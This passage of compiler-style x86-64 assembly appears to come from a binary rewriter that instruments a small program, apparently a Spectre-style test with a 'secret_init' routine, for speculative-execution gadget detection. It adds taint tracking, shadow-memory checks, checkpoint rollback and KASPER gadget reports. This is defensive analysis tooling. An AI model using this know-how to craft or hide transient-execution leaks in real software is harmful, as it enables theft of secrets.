            leaq 11554(%rip),%rbp
            btcq $45,%rbp
            orb (%rbp),%al
            testb $48,%al
            je .L__check_ok__teapot___59

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq $0,%rsi
            movq %rax,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_PORT@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__check_ok__teapot___59:

            nop
            movq (scratchpad+524288),%rax
            movq (instruction_cnt),%rbp
            addq $4,%rbp
            cmpq $250,%rbp
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rbp,(instruction_cnt)
            cmpq $0,(__cxa_finalize@GOTPCREL)(%rip)
            movq %rax,(scratchpad+524288)
            movq %rax,(scratchpad+524304)
            lahf 
            seto %al
            movq %rax,(scratchpad+524296)
            movq (scratchpad+524304),%rax
            xorl %ebp,%ebp
            orb (dift_reg_tags+6),%bpl
            movb %bpl,(dift_reg_tags+7)
.L__dift_done__teapot___61:

            nop
            movq %rax,(scratchpad+524304)
            movq (scratchpad+524296),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524304),%rax
            movq (scratchpad+524288),%rax
            movq %rsp,%rbp
            leaq (.__trampoline__be456ae1_c16a_45bc_a4a9_14a207f75d95__teapot__)(%rip),%rbp
            movq %rbp,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___62)(%rip),%rbp
            movq %rbp,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__be456ae1_c16a_45bc_a4a9_14a207f75d95__teapot__)(%rip),%rbp
            movq %rbp,(checkpoint_target_metadata+16)
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___62:

            nop
            je .L_12e7__teapot__
.L__trampoline_target__b617a250_9436_4534_8766_fd857a66a7a1__teapot__:

            movq %rax,(scratchpad+524288)
            leaq (.L_4008)(%rip),%rax
            btcq $45,%rax
            xorl %edi,%edi
            orb (%rax),%dil
            movb %dil,(dift_reg_tags+5)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___63

            movb (dift_reg_queued_tag),%dil
            movzbq (dift_reg_queued_id),%rbp
            orb %dil,(dift_reg_tags)(%rbp)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___63:

            nop
            movq (scratchpad+524288),%rax
            movq (.L_4008)(%rip),%rdi
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            leaq -8(%rsp),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rbp
            movq %rbx,(%rax)
            movq %rbp,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            jmp restore_checkpoint_EXT_LIB@PLT

            callq __cxa_finalize@PLT
.L_12e7__teapot__:

            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            leaq -8(%rsp),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rbp
            movq %rbx,(%rax)
            movq %rbp,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq (instruction_cnt),%rbp
            addq $1,%rbp
            cmpq $250,%rbp
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rbp,(instruction_cnt)
            callq deregister_tm_clones__teapot__

            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            xorl %ebp,%ebp
            leaq (completed.8061)(%rip),%rbx
            btcq $45,%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movb %bpl,(%rbx)
            addq $8,%rbx
.L__dift_done__teapot___68:

            nop
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            leaq (completed.8061)(%rip),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rbp
            movq %rbx,(%rax)
            movq %rbp,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movb $1,(completed.8061)(%rip)
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            leaq (%rsp),%rax
            btcq $45,%rax
            xorl %ebp,%ebp
            orb (%rax),%bpl
            movb %bpl,(dift_reg_tags+7)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___70

            movb (dift_reg_queued_tag),%bpl
            movzbq (dift_reg_queued_id),%rbx
            orb %bpl,(dift_reg_tags)(%rbx)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___70:

            nop
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            popq %rbp
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rsp,%rbx
            shrq $3,%rbx
            leaq 2147450880(%rbx),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movb $0,(%rbx)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq (instruction_cnt),%rax
            addq $3,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq (%rsp),%rax
            leaq (.__transient_start__teapot__)(%rip),%rbx
            movq %rax,%rcx
            subq %rbx,%rcx
            leaq (.__transient_end__teapot__)(%rip),%rbx
            cmpq %rcx,%rbx
            ja .L__indbr_check_skip__teapot___73

            cmpl $2430306120,(%rax)
            jne restore_checkpoint_MALFORMED_INDIRECT_BR@PLT
.L__indbr_check_skip__teapot___73:

            nop
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            retq 
.L_12f8__teapot__:

            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rsp,%rbx
            shrq $3,%rbx
            leaq 2147450880(%rbx),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movb $0,(%rbx)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq (instruction_cnt),%rax
            addq $1,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq (%rsp),%rax
            leaq (.__transient_start__teapot__)(%rip),%rbx
            movq %rax,%rcx
            subq %rbx,%rcx
            leaq (.__transient_end__teapot__)(%rip),%rbx
            cmpq %rcx,%rbx
            ja .L__indbr_check_skip__teapot___76

            cmpl $2430306120,(%rax)
            jne restore_checkpoint_MALFORMED_INDIRECT_BR@PLT
.L__indbr_check_skip__teapot___76:

            nop
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            retq 
.size __do_global_dtors_aux__teapot__, . - __do_global_dtors_aux__teapot__
frame_dummy__teapot__:

            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rsp,%rbx
            shrq $3,%rbx
            leaq 2147450880(%rbx),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movb $255,(%rbx)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            endbr64 
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rsp,%rbx
            shrq $3,%rbx
            leaq 2147450880(%rbx),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movb $0,(%rbx)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq (instruction_cnt),%rax
            addq $2,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            movq (scratchpad+524288),%rax
            jmp register_tm_clones__teapot__
.size frame_dummy__teapot__, . - frame_dummy__teapot__
set_heap_limit__teapot__:

            movq %rbx,(scratchpad+524288)
            movq %rsp,%rax
            shrq $3,%rax
            leaq 2147450880(%rax),%rax
            movq (memory_history_top),%rbx
            movq (%rax),%rsi
            movq %rax,(%rbx)
            movq %rsi,8(%rbx)
            leaq 16(%rbx),%rbx
            movq %rbx,(memory_history_top)
            movb $255,(%rax)
            movq (scratchpad+524288),%rbx
            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $111,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            endbr64 
            subq $40,%rsp
            movq %rbx,(scratchpad+524288)
            leaq %fs:40,%rbx
            btcq $45,%rbx
            xorl %esi,%esi
            orb (%rbx),%sil
            movb %sil,(dift_reg_tags)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___82

            movb (dift_reg_queued_tag),%sil
            movzbq (dift_reg_queued_id),%rax
            orb %sil,(dift_reg_tags)(%rax)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___82:

            nop
            movq (scratchpad+524288),%rbx
            movq %fs:40,%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            xorl %esi,%esi
            orb (dift_reg_tags+6),%sil
            orb (dift_reg_tags),%sil
            leaq 24(%rsp),%rbx
            btcq $45,%rbx
            movabsq $72340172838076673,%rcx
            imulq %rcx,%rsi
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq %rsi,(%rbx)
            addq $8,%rbx
.L__dift_done__teapot___83:

            nop
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            leaq 24(%rsp),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rsi
            movq %rbx,(%rax)
            movq %rsi,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,24(%rsp)
            movq %rax,(scratchpad+524288)
            xorl %esi,%esi
            movb %sil,(dift_reg_tags)
.L__dift_done__teapot___85:

            nop
            movq (scratchpad+524288),%rax
            xorl %eax,%eax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            xorl %esi,%esi
            orb (dift_reg_tags+6),%sil
            orb (dift_reg_tags+5),%sil
            leaq (%rsp),%rbx
            btcq $45,%rbx
            movabsq $72340172838076673,%rcx
            imulq %rcx,%rsi
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq %rsi,(%rbx)
            addq $8,%rbx
.L__dift_done__teapot___86:

            nop
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            leaq (%rsp),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rsi
            movq %rbx,(%rax)
            movq %rsi,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rdi,(%rsp)
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            xorl %esi,%esi
            orb (dift_reg_tags+6),%sil
            orb (dift_reg_tags+5),%sil
            leaq 8(%rsp),%rbx
            btcq $45,%rbx
            movabsq $72340172838076673,%rcx
            imulq %rcx,%rsi
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq %rsi,(%rbx)
            addq $8,%rbx
.L__dift_done__teapot___88:

            nop
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            leaq 8(%rsp),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rsi
            movq %rbx,(%rax)
            movq %rsi,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rdi,8(%rsp)
            xorl %esi,%esi
            orb (dift_reg_tags+6),%sil
            movb %sil,(dift_reg_tags+4)
.L__dift_done__teapot___90:

            nop
            movq %rsp,%rsi
            movq %rax,(scratchpad+524288)
            xorl %edi,%edi
            movb %dil,(dift_reg_tags+5)
.L__dift_done__teapot___91:

            nop
            movq (scratchpad+524288),%rax
            movl $9,%edi
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            leaq -8(%rsp),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            jmp restore_checkpoint_EXT_LIB@PLT

            callq setrlimit__dift_wrapper__@PLT
.L__ret_transform_target_set_heap_limit__0d648235_990a_4d62_8936_daa8a905a9db__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $107,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            xorl %eax,%eax
            orb (dift_reg_tags),%al
            orb (dift_reg_tags),%al
            testb $48,%al
            je .L__check_ok__teapot___95

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq $0,%rsi
            movq %rax,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_PORT@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__check_ok__teapot___95:

            nop
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq (instruction_cnt),%rax
            addq $2,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            movq (scratchpad+524288),%rax
            testl %eax,%eax
            leaq (.__trampoline__f87dc753_2ee9_4bd6_9821_e676ccd8147d__teapot__)(%rip),%rax
            movq %rax,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___97)(%rip),%rax
            movq %rax,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__f87dc753_2ee9_4bd6_9821_e676ccd8147d__teapot__)(%rip),%rax
            movq %rax,(checkpoint_target_metadata+16)
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___97:

            nop
            jne .L_1350__teapot__
.L__trampoline_target__8102deb9_fe07_4f28_9772_f41855e0b4e1__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $109,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            movq %rbx,(scratchpad+524288)
            movq %rcx,(scratchpad+524296)
            leaq 24(%rsp),%rcx
            xorq %rbx,%rbx
            orb (dift_reg_tags+6),%bl
            testb $48,%bl
            je .L__attacker_tags_check__teapot___99

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rcx,%rsi
            movq %rbx,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_CACHE@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__attacker_tags_check__teapot___99:

            testb $2,%bl
            je .L__asan_check__teapot___99

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rcx,%rsi
            movq %rbx,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $32,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__asan_check__teapot___99:

            movq %rcx,%rax
            shrq $3,%rax
            movb 2147450880(%rax),%al
            testb %al,%al
            je .L__mem_operand_policy_done__teapot___99
.L__asan_check_fail__teapot___99:

            testb $1,%bl
            je .L__asan_check_fail_non_attacker__teapot___99
.L__asan_check_fail_attacker__teapot___99:

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq %rcx,%rsi
            movq %rbx,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_MDS@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
            orb $16,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
            jmp .L__mem_operand_policy_done__teapot___99
.L__asan_check_fail_non_attacker__teapot___99:

            orb $2,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__mem_operand_policy_done__teapot___99:

            nop
            movq (scratchpad+524296),%rcx
            movq (scratchpad+524288),%rbx
            movq %rbx,(scratchpad+524288)
            movq %rcx,(scratchpad+524296)
            leaq 24(%rsp),%rbx
            btcq $45,%rbx
            xorl %eax,%eax
            orb (dift_reg_tags+6),%al
            orb (%rbx),%al
            movb %al,(dift_reg_tags)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___100

            movb (dift_reg_queued_tag),%al
            movzbq (dift_reg_queued_id),%rcx
            orb %al,(dift_reg_tags)(%rcx)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___100:

            nop
            movq (scratchpad+524296),%rcx
            movq (scratchpad+524288),%rbx
            movq 24(%rsp),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            xorl %eax,%eax
            orb (dift_reg_tags),%al
            leaq %fs:40,%rbx
            btcq $45,%rbx
            orb (%rbx),%al
            testb $48,%al
            je .L__check_ok__teapot___101

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
            movq %rdx,(scratchpad+16)
            movq $0,%rsi
            movq %rax,%rdx
            leaq (%rip),%rdi
            callq report_gadget_KASPER_PORT@PLT

            movq (scratchpad+16),%rdx
            movq (scratchpad+8),%rdi
            movq (scratchpad),%rsi
            movq (old_rsp),%rsp
.L__check_ok__teapot___101:

            nop
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            leaq %fs:40,%rax
            btcq $45,%rax
            xorl %ecx,%ecx
            orb (dift_reg_tags),%cl
            orb (%rax),%cl
            movb %cl,(dift_reg_tags)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___102

            movb (dift_reg_queued_tag),%cl
            movzbq (dift_reg_queued_id),%rbx
            orb %cl,(dift_reg_tags)(%rbx)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___102:

            nop
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq (instruction_cnt),%rax
            addq $3,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            movq (scratchpad+524288),%rax
            xorq %fs:40,%rax
            movq %rax,(scratchpad)
            leaq (.__trampoline__8de62071_7928_4381_a7eb_0b62b6f1f7b7__teapot__)(%rip),%rax
            movq %rax,(checkpoint_target_metadata)
            leaq (.L__after_checkpoint__teapot___104)(%rip),%rax
            movq %rax,(checkpoint_target_metadata+8)
            leaq (.__branch_counter__8de62071_7928_4381_a7eb_0b62b6f1f7b7__teapot__)(%rip),%rax
            movq %rax,(checkpoint_target_metadata+16)
            movq (scratchpad),%rax
            jmp make_checkpoint@PLT
.L__after_checkpoint__teapot___104:

            nop
            jne .L_1366__teapot__
.L__trampoline_target__fa5a5ad2_a4a8_48a5_a4d4_fc4b3fb8d23e__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $110,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            addq $40,%rsp
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq %rsp,%rbx
            shrq $3,%rbx
            leaq 2147450880(%rbx),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movb $0,(%rbx)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq (instruction_cnt),%rax
            addq $2,%rax
            cmpq $250,%rax
            jge restore_checkpoint_ROB_LEN@PLT

            movq %rax,(instruction_cnt)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            movq (%rsp),%rax
            leaq (.__transient_start__teapot__)(%rip),%rbx
            movq %rax,%rcx
            subq %rbx,%rcx
            leaq (.__transient_end__teapot__)(%rip),%rbx
            cmpq %rcx,%rbx
            ja .L__indbr_check_skip__teapot___108

            cmpl $2430306120,(%rax)
            jne restore_checkpoint_MALFORMED_INDIRECT_BR@PLT
.L__indbr_check_skip__teapot___108:

            nop
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            retq 
.L_1350__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $106,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            xorl %esi,%esi
            movb %sil,(dift_reg_tags+5)
.L__dift_done__teapot___110:

            nop
            leaq (.L_2004)(%rip),%rdi
            leaq -8(%rsp),%rsi
            movq (memory_history_top),%r12
            movq (%rsi),%r11
            movq %rsi,(%r12)
            movq %r11,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            jmp restore_checkpoint_EXT_LIB@PLT

            callq perror@PLT
.L__ret_transform_target_set_heap_limit__7145636e_dc08_4f64_b62f_2ca04a333ff8__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $108,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rax,(scratchpad+524312)
            lahf 
            seto %al
            movq %rax,(scratchpad+524304)
            movq (scratchpad+524312),%rax
            xorl %ebx,%ebx
            movb %bl,(dift_reg_tags+5)
.L__dift_done__teapot___114:

            nop
            movq %rax,(scratchpad+524312)
            movq (scratchpad+524304),%rax
            addb $127,%al
            sahf 
            movq (scratchpad+524312),%rax
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movl $1,%edi
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            leaq -8(%rsp),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            jmp restore_checkpoint_EXT_LIB@PLT

            callq exit@PLT
.L_1366__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $112,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            leaq -8(%rsp),%rsi
            movq (memory_history_top),%r12
            movq (%rsi),%r11
            movq %rsi,(%r12)
            movq %r11,8(%r12)
            leaq 16(%r12),%r12
            movq %r12,(memory_history_top)
            jmp restore_checkpoint_EXT_LIB@PLT

            callq __stack_chk_fail@PLT
.size set_heap_limit__teapot__, . - set_heap_limit__teapot__
secret_init__teapot__:

            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rsp,%rbx
            shrq $3,%rbx
            leaq 2147450880(%rbx),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rdi
            movq %rbx,(%rax)
            movq %rdi,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movb $255,(%rbx)
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $64,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            endbr64 
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            movq %rcx,(scratchpad+524304)
            xorl %edi,%edi
            orb (dift_reg_tags+1),%dil
            leaq -8(%rsp),%rbx
            btcq $45,%rbx
            movabsq $72340172838076673,%rcx
            imulq %rcx,%rdi
            movq (memory_history_top),%rax
            movq (%rbx),%rcx
            movq %rbx,(%rax)
            movq %rcx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq %rdi,(%rbx)
            addq $8,%rbx
.L__dift_done__teapot___122:

            nop
            movq (scratchpad+524304),%rcx
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            movq %rax,(scratchpad+524288)
            movq %rbx,(scratchpad+524296)
            leaq -8(%rsp),%rbx
            movq (memory_history_top),%rax
            movq (%rbx),%rdi
            movq %rbx,(%rax)
            movq %rdi,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq (scratchpad+524296),%rbx
            movq (scratchpad+524288),%rax
            pushq %rbx
            movq %rax,(scratchpad+524288)
            leaq (array_size)(%rip),%rax
            btcq $45,%rax
            xorl %ebx,%ebx
            orb (%rax),%bl
            movb %bl,(dift_reg_tags+5)
            cmpb $0,(dift_reg_queued_tag)
            je .L__dift_done__teapot___124

            movb (dift_reg_queued_tag),%bl
            movzbq (dift_reg_queued_id),%rdi
            orb %bl,(dift_reg_tags)(%rdi)
            movb $0,(dift_reg_queued_tag)
            movb $0,(dift_reg_queued_id)
.L__dift_done__teapot___124:

            nop
            movq (scratchpad+524288),%rax
            movl (array_size)(%rip),%edi
            movl %edi,%edi
            movq %rax,(scratchpad+524288)
            movq %rcx,(scratchpad+524296)
            leaq -8(%rsp),%rcx
            movq (memory_history_top),%rax
            movq (%rcx),%rbx
            movq %rcx,(%rax)
            movq %rbx,8(%rax)
            leaq 16(%rax),%rax
            movq %rax,(memory_history_top)
            movq (scratchpad+524296),%rcx
            movq (scratchpad+524288),%rax
            jmp restore_checkpoint_EXT_LIB@PLT

            callq malloc@PLT
.L__ret_transform_target_secret_init__47750739_4dbe_4b09_814d_88018b305708__teapot__:

            movq %rax,(scratchpad+524288)
            movq (guard_list_top),%rax
            movl $67,(%rax)
            leaq 4(%rax),%rax
            movq %rax,(guard_list_top)
            movq (scratchpad+524288),%rax
            xorl %ebx,%ebx
            orb (dift_reg_tags),%bl
            movb %bl,(dift_reg_tags+1)
.L__dift_done__teapot___128:

            nop
            movq %rax,%rbx
            xorl %edi,%edi
            orb (dift_reg_tags),%dil
            orb (dift_reg_tags),%dil
            testb $48,%dil
            je .L__check_ok__teapot___129

            movq %rsp,(old_rsp)
            leaq (scratchpad+1048544),%rsp
            movq %rsi,(scratchpad)
            movq %rdi,(scratchpad+8)
